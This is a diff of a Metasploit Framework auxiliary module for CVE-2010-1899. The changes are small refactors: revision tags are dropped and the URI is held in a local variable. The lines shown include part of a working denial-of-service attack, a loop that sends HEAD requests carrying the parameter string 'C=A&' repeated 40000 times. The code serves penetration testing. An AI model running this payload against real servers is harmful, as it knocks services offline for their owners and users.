@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -32,7 +28,6 @@ class Metasploit3 < Msf::Auxiliary
 					'Leandro Oliveira <leadro[at]alligatorteam.org>'
 				],
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					[ 'CVE', '2010-1899' ],
@@ -52,7 +47,8 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run
-		print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{datastore['URI']}")
+		uri = datastore['URI']
+		print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{uri}")
 
 		begin
 			while(1)
@@ -60,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 					connect
 					payload = "C=A&" * 40000
 					length = payload.size
-					sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
+					sploit = "HEAD #{uri} HTTP/1.1\r\n"
 					sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
 					sploit << "Connection:Close\r\n"
 					sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
